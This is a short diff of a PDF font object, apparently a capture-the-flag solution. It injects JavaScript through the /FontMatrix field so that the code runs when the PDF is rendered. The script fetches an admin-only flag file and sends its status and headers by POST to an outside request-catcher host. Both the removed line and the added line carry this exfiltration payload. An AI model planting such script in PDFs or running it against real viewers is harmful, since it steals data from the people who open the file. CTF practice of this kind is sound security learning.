@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-fetch\('/app/admin/flag.pdf'\).then\(r=>fetch\('https://ictushc.request.dreamhack.games',{method:'POST',body:'status='+r.status+'\nheaders='+[...r.headers].map\(\([k,v]\)=>k+': '+v\).join\('\n'\)}\)\).catch\(e=>fetch\('https://ictushc.request.dreamhack.games',{method:'POST',body:'error='+e.toString\(\)}\)\);
+fetch\('/app/admin/flag.pdf'\).then\(r=>fetch\('https://ictushc.request.dreamhack.games',{method:'POST',body:r.status+' '+[...r.headers].map\(\([k,v]\)=>k+':'+v\).join\(';'\)}\)\);
 //)]
 /Subtype/Type1
 /FirstChar 65
